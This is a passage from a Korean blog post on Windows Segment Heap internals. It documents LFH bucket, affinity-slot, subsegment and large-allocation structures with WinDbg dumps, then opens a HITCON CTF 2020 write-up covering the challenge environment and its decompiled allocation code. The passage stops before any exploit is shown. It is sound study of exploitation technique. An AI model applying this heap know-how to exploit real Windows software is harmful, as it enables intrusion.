&#xC99D;&#xAC00;&#xD558;&#xACE0;, &#xC5EC;&#xC720; &#xACF5;&#xAC04;&#xC774; &#xC0DD;&#xAE30;&#xBA74; &#xAC10;&#xC18C;&#xD558;&#xB294; &#xAC12;</li><li>&#xBE44;&#xD2B8; 5~15&#xB294; &#xD560;&#xB2F9; &#xC694;&#xCCAD; &#xC218;&#xB85C;, &#xD560;&#xB2F9; &#xC2DC; &#xC99D;&#xAC00;</li></ul></li></ul><h2 id="HEAP-LFH-BUCKET"><a href="#HEAP-LFH-BUCKET" class="headerlink" title="_HEAP_LFH_BUCKET"></a>_HEAP_LFH_BUCKET</h2><p>&#xBC84;&#xD0B7;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; <code>LfhContext.Bucket</code>&#xB294; <code>_HEAP_LFH_BUCKET</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LFH_BUCKET   +<span class="hljs-number">0x000</span> State            : _HEAP_LFH_SUBSEGMENT_OWNER   +<span class="hljs-number">0x038</span> TotalBlockCount  : Uint8B   +<span class="hljs-number">0x040</span> TotalSubsegmentCount : Uint8B   +<span class="hljs-number">0x048</span> ReciprocalBlockSize : Uint4B   +<span class="hljs-number">0x04c</span> Shift            : UChar   +<span class="hljs-number">0x04d</span> ContentionCount  : UChar   +<span class="hljs-number">0x050</span> AffinityMappingLock : Uint8B   +<span class="hljs-number">0x058</span> ProcAffinityMapping : Ptr64 UChar   +<span class="hljs-number">0x060</span> AffinitySlots    : Ptr64 Ptr64 _HEAP_LFH_AFFINITY_SLOT</code></pre><ul><li><code>TotalBlockCount</code> : &#xBC84;&#xD0B7;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xBAA8;&#xB4E0; LFH subsegment&#xC758; &#xCD1D; LFH &#xBE14;&#xB85D; &#xC218;</li><li><code>TotalSubsegmentCount</code> : &#xBC84;&#xD0B7;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xBAA8;&#xB4E0; LFH subsegment&#xC758; &#xC218;</li><li><code>ContentionCount</code> : LFH subsegment&#xC5D0;&#xC11C; &#xBE14;&#xB85D;&#xC744; &#xD560;&#xB2F9;&#xD560; &#xB54C; &#xC2DD;&#xBCC4;&#xB41C; contentions(&#xACBD;&#xD569;) &#xC218;<ul><li>&#xC774; &#xD544;&#xB4DC;&#xAC00; <code>RtlpHpLfhContentionLimit</code>&#xB9CC;&#xD07C; &#xCEE4;&#xC9C8; &#xB54C;&#xB9C8;&#xB2E4; &#xC694;&#xCCAD;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0; &#xB300;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; Affinity Slot&#xC774; &#xC0DD;&#xC131;&#xB428;</li></ul></li><li><code>ProcAffinityMapping</code> : AffinitySlots&#xC5D0; &#xB300;&#xD55C; index &#xBC30;&#xC5F4;</li><li><code>AffinitySlots</code> : Affinity slot &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;(<code>_HEAP_LFH_AFFINITY_SLOT</code>)<ul><li>&#xCCAB; &#xBC84;&#xD0B7;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74; &#xCC98;&#xC74C;&#xC5D4; &#xD558;&#xB098;&#xC758; &#xC2AC;&#xB86F;&#xB9CC; &#xC0DD;&#xC131;&#xB418;&#xC9C0;&#xB9CC;, contentions&#xC774; &#xAC10;&#xC9C0;&#xB420;&#xC218;&#xB85D; &#xC0C8;&#xB85C;&#xC6B4; affinity slot&#xC774; &#xC0DD;&#xC131;&#xB428;</li></ul></li></ul><h2 id="HEAP-LFH-AFFINITY-SLOT"><a href="#HEAP-LFH-AFFINITY-SLOT" class="headerlink" title="_HEAP_LFH_AFFINITY_SLOT"></a>_HEAP_LFH_AFFINITY_SLOT</h2><p>Affinity &#xC2AC;&#xB86F;&#xC5D0;&#xB294; LFH &#xBE14;&#xB85D;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xB294; LFH subsegment&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xBC84;&#xD0B7;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xACE0;  &#xD558;&#xB098;&#xC758; Affinity &#xC2AC;&#xB86F;&#xB9CC; &#xC0DD;&#xC131;&#xB418;&#xC9C0;&#xB9CC; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; &#xB3D9;&#xC77C;&#xD55C; LFH subsegment &#xC9D1;&#xD569;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; &#xC77C;&#xC815; &#xC218; &#xC774;&#xC0C1;&#xC758; &#xACBD;&#xD569;&#xC774; &#xAC10;&#xC9C0;&#xB418;&#xBA74; &#xC0C8; Affinity &#xC2AC;&#xB86F;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xC694;&#xCCAD; &#xC2A4;&#xB808;&#xB4DC;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xAC00; &#xBC84;&#xD0B7;&#xC758; <code>ProcAffinityMapping</code> &#xD544;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xC0C8; Affinity &#xC2AC;&#xB86F;&#xC5D0; &#xC7AC;&#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LFH_AFFINITY_SLOT   +<span class="hljs-number">0x000</span> State            : _HEAP_LFH_SUBSEGMENT_OWNER</code></pre><h2 id="HEAP-LFH-SUBSEGMENT-OWNER"><a href="#HEAP-LFH-SUBSEGMENT-OWNER" class="headerlink" title="_HEAP_LFH_SUBSEGMENT_OWNER"></a>_HEAP_LFH_SUBSEGMENT_OWNER</h2><p><code>LfhAffinitySlot.State</code> &#xC758; LFH subsegment &#xCD94;&#xC801;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xBA70; &#xB2E4;&#xC74C; &#xD544;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LFH_SUBSEGMENT_OWNER   +<span class="hljs-number">0x000</span> IsBucket         : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x000</span> Spare0           : Pos <span class="hljs-number">1</span>, <span class="hljs-number">7</span> Bits   +<span class="hljs-number">0x001</span> BucketIndex      : UChar   +<span class="hljs-number">0x002</span> SlotCount        : UChar   +<span class="hljs-number">0x002</span> SlotIndex        : UChar   +<span class="hljs-number">0x003</span> Spare1           : UChar   +<span class="hljs-number">0x008</span> AvailableSubsegmentCount : Uint8B   +<span class="hljs-number">0x010</span> Lock             : Uint8B   +<span class="hljs-number">0x018</span> AvailableSubsegmentList : _LIST_ENTRY   +<span class="hljs-number">0x028</span> FullSubsegmentList : _LIST_ENTRY</code></pre><ul><li><code>AvailableSubsegmentCount</code> : <code>AvailableSubsegmentList</code>&#xC5D0; &#xC788;&#xB294; LFH subsegment&#xC758; &#xC218;</li><li><code>AvailableSubsegmentList</code> : &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; LFH &#xBE14;&#xB85D;&#xC774; &#xC788;&#xB294; LFH subsegment&#xC758; linked list</li><li><code>FullSubsegmentList</code> : &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; LFH &#xBE14;&#xB85D;&#xC774; &#xC5C6;&#xB294;, &#xBAA8;&#xB450; &#xCC2C; &#xC0C1;&#xD0DC;&#xC758; LFH subsegment&#xC758; linked list</li></ul><h2 id="HEAP-LFH-SUBSEGMENT"><a href="#HEAP-LFH-SUBSEGMENT" class="headerlink" title="_HEAP_LFH_SUBSEGMENT"></a>_HEAP_LFH_SUBSEGMENT</h2><p>LFH subsegment&#xB294; LFH &#xBE14;&#xB85D;&#xC774; &#xD560;&#xB2F9;&#xB418;&#xB294; &#xACF3;&#xC774;&#xBA70; <code>RtlpHpLfhSubsegmentCreate()</code>&#xB97C; &#xD1B5;&#xD574; &#xC0DD;&#xC131; &#xBC0F; &#xCD08;&#xAE30;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.  LFH subsegment&#xB294; &#xD574;&#xB2F9; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD5E4;&#xB354;&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LFH_SUBSEGMENT -r   +<span class="hljs-number">0x000</span> ListEntry        : _LIST_ENTRY   +<span class="hljs-number">0x010</span> Owner            : Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER   +<span class="hljs-number">0x010</span> DelayFree        : _HEAP_LFH_SUBSEGMENT_DELAY_FREE      +<span class="hljs-number">0x000</span> DelayFree        : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit      +<span class="hljs-number">0x000</span> Count            : Pos <span class="hljs-number">1</span>, <span class="hljs-number">63</span> Bits      +<span class="hljs-number">0x000</span> AllBits          : Ptr64 Void   +<span class="hljs-number">0x018</span> CommitLock       : Uint8B   +<span class="hljs-number">0x020</span> FreeCount        : Uint2B   +<span class="hljs-number">0x022</span> BlockCount       : Uint2B   +<span class="hljs-number">0x020</span> InterlockedShort : Int2B   +<span class="hljs-number">0x020</span> InterlockedLong  : Int4B   +<span class="hljs-number">0x024</span> FreeHint         : Uint2B   +<span class="hljs-number">0x026</span> Location         : UChar   +<span class="hljs-number">0x027</span> WitheldBlockCount : UChar   +<span class="hljs-number">0x028</span> BlockOffsets     : _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS      +<span class="hljs-number">0x000</span> BlockSize        : Uint2B      +<span class="hljs-number">0x002</span> FirstBlockOffset : Uint2B      +<span class="hljs-number">0x000</span> EncodedData      : Uint4B   +<span class="hljs-number">0x02c</span> CommitUnitShift  : UChar   +<span class="hljs-number">0x02d</span> CommitUnitCount  : UChar   +<span class="hljs-number">0x02e</span> CommitStateOffset : Uint2B   +<span class="hljs-number">0x030</span> BlockBitmap      : [<span class="hljs-number">1</span>] Uint8B</code></pre><ul><li><code>Listentry</code> : &#xAC01; LFH subsegment&#xB294; Affinity &#xC2AC;&#xB86F;&#xC758; LFH subsegment &#xBAA9;&#xB85D;(<code>LfhAffinitySlot.AvailableSubsegmentList</code> &#xB610;&#xB294; <code>LfhAffinitySlot.FullSubsegmentList</code>) &#xC911; &#xD558;&#xB098;&#xC758; &#xB178;&#xB4DC;</li><li><code>owner</code> : &#xC774; LFH subsegment&#xB97C; &#xC18C;&#xC720;&#xD558;&#xB294; Affinity &#xC2AC;&#xB86F;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;</li><li><code>FreeHint</code> : &#xCD5C;&#xADFC;&#xC5D0; &#xD560;&#xB2F9;&#xB418;&#xAC70;&#xB098; &#xD574;&#xC81C;&#xB41C; LFH &#xBE14;&#xB85D;&#xC758; &#xBE14;&#xB85D; &#xC778;&#xB371;&#xC2A4;. &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; LFH &#xBE14;&#xB85D;&#xC744; &#xAC80;&#xC0C9;&#xD560; &#xB54C; &#xD560;&#xB2F9; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC5D0; &#xC0AC;&#xC6A9;&#xB428;</li><li><code>Location</code> : Affiniy &#xC2AC;&#xB86F;&#xC758; LFH subsegment &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xC774; LFH subsegment &#xC704;&#xCE58;: 0 - AvailableSubsegmentList, 1 -  FullSubsegmentList</li><li><code>FreeCount</code> : LFH subsegment&#xC758; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBE14;&#xB85D; &#xC218;</li><li><code>BlockCount</code> : LFH subsegment&#xC758; &#xCD1D; &#xBE14;&#xB85D; &#xC218;</li><li><code>BlockOffsets</code> : &#xC778;&#xCF54;&#xB529;&#xB41C; &#xAC01; LFH &#xBE14;&#xB85D;&#xC758; &#xD06C;&#xAE30;&#xC640; LFH subsegment&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; LFH &#xBE14;&#xB85D;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; DWORD &#xD06C;&#xAE30;&#xC758; &#xD558;&#xC704; &#xAD6C;&#xC870;&#xCCB4;</li><li><code>BlockSize</code> : LFH subsegment&#xC5D0; &#xC788;&#xB294; &#xAC01; LFH &#xBE14;&#xB85D;&#xC758; &#xD06C;&#xAE30;</li><li><code>FirstBlockOffset</code> : LFH subsegment&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; LFH &#xBE14;&#xB85D;&#xC758; &#xC624;&#xD504;&#xC14B;</li><li><code>CommitStateOffset</code> : LFH subsegment&#xC5D0;&#xC11C; &#xCEE4;&#xBC0B; &#xC0C1;&#xD0DC; &#xBC30;&#xC5F4;&#xC758; &#xC624;&#xD504;&#xC14B;.<ul><li>LFH subsegment&#xB294; &#xC5EC;&#xB7EC; &#xCEE4;&#xBC0B;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xB294;&#xB370;, &#xCEE4;&#xBC0B; &#xC0C1;&#xD0DC;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xAC01; &#xCEE4;&#xBC0B; &#xC0C1;&#xD0DC;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; WORD &#xD06C;&#xAE30; &#xAC12;&#xC758; &#xBC30;&#xC5F4;</li></ul></li><li><code>BlockBitmap</code> : &#xAC01; LFH &#xBE14;&#xB85D;&#xC740; &#xC774; &#xBE14;&#xB85D; &#xBE44;&#xD2B8;&#xB9F5;&#xC5D0;&#xC11C; 2&#xBE44;&#xD2B8;&#xB85C; &#xD45C;&#xC2DC;&#xB428;</li></ul><h1 id="Large-Blocks-Allocation"><a href="#Large-Blocks-Allocation" class="headerlink" title="Large Blocks Allocation"></a>Large Blocks Allocation</h1><p>large block &#xD560;&#xB2F9;&#xC740; &#xD06C;&#xAE30;&#xAC00; 520,193 bytes &#xC774;&#xC0C1;(&gt;= 0x7F001)&#xC778; &#xD560;&#xB2F9;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. large block&#xC740; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC5D0; &#xD5E4;&#xB354;&#xAC00; &#xC5C6;&#xC73C;&#xBA70; NT memory allocator&#xC758; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD560;&#xB2F9; &#xBC0F; &#xD574;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="HEAP-LARGE-ALLOC-DATA"><a href="#HEAP-LARGE-ALLOC-DATA" class="headerlink" title="_HEAP_LARGE_ALLOC_DATA"></a>_HEAP_LARGE_ALLOC_DATA</h2><p>&#xAC01; large block&#xC5D0;&#xB294; &#xC544;&#xB798; &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xC73C;&#xBA70; &#xC774; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB294; &#xD2B9;&#xC774;&#xD558;&#xAC8C;&#xB3C4; &#xB2E4;&#xB978; &#xBE14;&#xB85D;&#xACFC; &#xB2E4;&#xB974;&#xAC8C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC8FC;&#xC18C;&#xAC00; &#xC804;&#xC5ED; &#xBCC0;&#xC218; <code>RtlpHpMetadataHeap</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xD799;&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">029</span>&gt; dt ntdll!_HEAP_LARGE_ALLOC_DATA   +<span class="hljs-number">0x000</span> TreeNode         : _RTL_BALANCED_NODE   +<span class="hljs-number">0x018</span> VirtualAddress   : Uint8B   +<span class="hljs-number">0x018</span> UnusedBytes      : Pos <span class="hljs-number">0</span>, <span class="hljs-number">16</span> Bits   +<span class="hljs-number">0x020</span> ExtraPresent     : Pos <span class="hljs-number">0</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x020</span> GuardPageCount   : Pos <span class="hljs-number">1</span>, <span class="hljs-number">1</span> Bit   +<span class="hljs-number">0x020</span> GuardPageAlignment : Pos <span class="hljs-number">2</span>, <span class="hljs-number">6</span> Bits   +<span class="hljs-number">0x020</span> Spare            : Pos <span class="hljs-number">8</span>, <span class="hljs-number">4</span> Bits   +<span class="hljs-number">0x020</span> AllocatedPages   : Pos <span class="hljs-number">12</span>, <span class="hljs-number">52</span> Bits</code></pre><ul><li><code>TreeNode</code> : &#xAC01; large block &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB294; <code>HeapBase.LargeAllocMetadata</code>&#xC758; &#xB178;&#xB4DC;</li><li><code>VirtualAddress</code> : &#xBE14;&#xB85D;&#xC758; &#xC8FC;&#xC18C;. &#xCC98;&#xC74C; 16&#xBE44;&#xD2B8;&#xB294; <code>UnusedBytes</code> &#xD544;&#xB4DC;&#xC5D0; &#xC0AC;&#xC6A9;&#xB428;</li><li><code>UnusedBytes</code> : <code>UserSize</code>&#xC640; &#xBE14;&#xB85D;&#xC758; &#xCEE4;&#xBC0B;&#xB41C; &#xD06C;&#xAE30; &#xAC04;&#xC758; &#xCC28;&#xC774;</li><li><code>AllocatedPages</code> : &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xBE14;&#xB85D;&#xC758; &#xCEE4;&#xBC0B;&#xB41C; &#xD06C;&#xAE30;</li></ul><p>&#xB4DC;&#xB514;&#xC5B4; Segment Heap &#xAD00;&#xB828; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC744; &#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C;&#xB098;&#xB9C8; &#xBAA8;&#xB450; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC2E4; Segment Heap&#xC744; &#xACF5;&#xBD80;&#xD560; &#xB54C; &#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; &#xC124;&#xBA85;&#xD55C; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xB294;&#xAC74; &#xC544;&#xB2C8;&#xC9C0;&#xB9CC;..&#x314E;&#x314E; &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xACE0;, &#xD544;&#xB4DC;&#xB4E4;&#xC774; &#xD560;&#xB2F9;&#xACFC; &#xD560;&#xB2F9;&#xD574;&#xC81C;&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xB4E4;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xCC3E;&#xB2E4;&#xBCF4;&#xBA74; &#xC774;&#xD574;&#xAC00; &#xB418;&#xAE30;&#xC5D0; &#xC77C;&#xB2E8; &#xB0C5;&#xB2E4; &#xC815;&#xB9AC;&#xD574;&#xBC84;&#xB9AC;&#xB294;&#xAC70;&#xC8E0;. </p><h1 id="HITCON-CTF-2020-Archangel-Michael&#x2019;s-Storage"><a href="#HITCON-CTF-2020-Archangel-Michael&#x2019;s-Storage" class="headerlink" title="HITCON CTF 2020 - Archangel Michael&#x2019;s Storage"></a>HITCON CTF 2020 - <strong>Archangel Michael&#x2019;s Storage</strong></h1><p>&#xC774;&#xC81C;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCFC; &#xC2DC;&#xAC04;&#xC774;&#xAD70;&#xC694;! &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD799;&#xC758; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC608;&#xC2DC;&#xB97C; HITCON CTF 2020&#xC5D0; &#xB098;&#xC628; Michael&#x2019;s Storage&#xB77C;&#xB294; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA74;&#xC11C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xC804;&#xC5D0; NT Heap &#xBB38;&#xC81C;&#xB3C4; &#xADF8;&#xB807;&#xACE0;, &#xC774; &#xBB38;&#xC81C;&#xB3C4; angelboy&#xB77C;&#xB294; &#xBD84;&#xC774; &#xB9CC;&#xB4DC;&#xC2E0; &#xBB38;&#xC81C;&#xC778;&#xB370; &#xACF5;&#xBD80;&#xD558;&#xAE30; &#xC88B;&#xC740; &#xBB38;&#xC81C;&#xB4E4;&#xC778; &#xAC83; &#xAC19;&#xB124;&#xC694;. <a href="https://github.com/scwuaptx/CTF">https://github.com/scwuaptx/CTF</a> &#xC5D0; windows exploit&#xC5D0; &#xAD00;&#xB828;&#xD55C; &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB4E4;&#xB3C4; &#xC788;&#xC73C;&#xB2C8; &#xAD81;&#xAE08;&#xD558;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xD55C;&#xBC88;&#xCBE4; &#xBCF4;&#xC154;&#xB3C4; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC77C;&#xB2E8; &#xD658;&#xACBD;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740;&#xB370;&#xC694;, &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC774; &#xBAA8;&#xB450; &#xAC78;&#xB824;&#xC788;&#xACE0; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD799;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul><li>Windows x64 20H@</li><li>DEP</li><li>ASLR</li><li>CFG</li><li>Private Heap<ul><li>&#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xD480;</li></ul></li><li>Segment Heap</li></ul><pre><code class="hljs c">reg add <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MichaelStorage.exe&quot;</span> /v FrontEndHeapDebugOptions /t REG_DWORD /d <span class="hljs-number">0x8</span> /fAppJailLauncher.exe ./MichaelStorage.exe /timeout:<span class="hljs-number">12000000</span> /key:flag.txt /port:<span class="hljs-number">56746</span></code></pre><p>&#xBB38;&#xC81C;&#xD30C;&#xC77C; &#xD658;&#xACBD;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xBC30;&#xCE58;&#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370;, <code>0x8</code>&#xB85C; bit 3&#xC758; Enable Segment Heap&#xC744; &#xC124;&#xC815;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC138;&#xADF8;&#xBA3C;&#xD2B8; &#xD799;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xB2E4;&#xB294; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>&#xC774;&#xC81C; &#xC5B4;&#xB5A4; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294; &#xB140;&#xC11D;&#xC778;&#xC9C0; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;! </p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled%202.png" alt="Untitled"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xC885;&#xB8CC;&#xD558;&#xAE30;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xB124;&#xAC1C;&#xC758; &#xBA54;&#xB274;&#xAC00; &#xBCF4;&#xC774;&#xB124;&#xC694;. &#xBA54;&#xB274;&#xBCC4;&#xB85C; &#xAC01;&#xAC01; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; 1&#xBC88; &#xBA54;&#xB274;&#xB294; &#xD0C0;&#xC785;&#xACFC; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC785;&#xB825;&#xBC1B;&#xACE0; &#xC0C8;&#xB85C;&#xC6B4; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. &#xCD5C;&#xB300; 16&#xAC1C;&#xC758; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i )  {    <span class="hljs-keyword">if</span> ( !Storage[i].is_allocated )    {      sub_7FF6203D1060(<span class="hljs-string">&quot;Type of storage:&quot;</span>);      storage_type = sub_7FF6203D1210();      sub_7FF6203D1060(<span class="hljs-string">&quot;Size:&quot;</span>);      size = sub_7FF6203D1210();...</code></pre><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled%203.png" alt="Untitled"></p><p>16&#xAC1C;&#xC758; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; 48 bytes &#xD06C;&#xAE30;&#xC758; Stroage &#xAD6C;&#xC870;&#xCCB4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xB294; 0&#xBD80;&#xD130; 3&#xAE4C;&#xC9C0; &#xB124; &#xAC00;&#xC9C0; &#xD0C0;&#xC785;&#xC774; &#xC788;&#xACE0;, &#xC785;&#xB825;&#xBC1B;&#xC740; &#xD0C0;&#xC785;&#xBCC4;&#xB85C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xC5D0; &#xAC01; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; ++i ){...<span class="hljs-keyword">if</span> ( storage_type == <span class="hljs-number">1</span> )  {      sub_7FF6203D1060(<span class="hljs-string">&quot;The size of secret is %u\n&quot;</span>, <span class="hljs-number">512</span>i64);      Storage.heap_ptr = HeapAlloc_1400010C0(<span class="hljs-number">0x1010</span>, v1);      <span class="hljs-keyword">if</span> ( !Storage.heap_ptr )      {        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;allocate error&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);      }      Storage[i].heap_ptr-&gt;size = <span class="hljs-number">512</span>;      chunk_size[i] = <span class="hljs-number">512</span>;      Storage[i].is_allocated = <span class="hljs-number">1</span>;      Storage[i].type = storage_type;  }</code></pre><p>&#xD0C0;&#xC785; 1&#xC758; &#xACBD;&#xC6B0; &#xD799;&#xC5D0; <code>0x1010</code> &#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xC744; &#xD558;&#xB124;&#xC694;. &#xB098;&#xBA38;&#xC9C0; &#xD0C0;&#xC785;&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD0C0;&#xC785; 0&#xC740; <code>size * 4 + 16</code>&#xB9CC;&#xD07C;, &#xD0C0;&#xC785; 2&#xB294; <code>size + 16</code>, &#xD0C0;&#xC785; 3&#xB294; <code>size</code>&#xB9CC;&#xD07C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC800;&#xC7A5;&#xB418;&#xB294; &#xB370;&#xC774;&#xD130;&#xB85C; 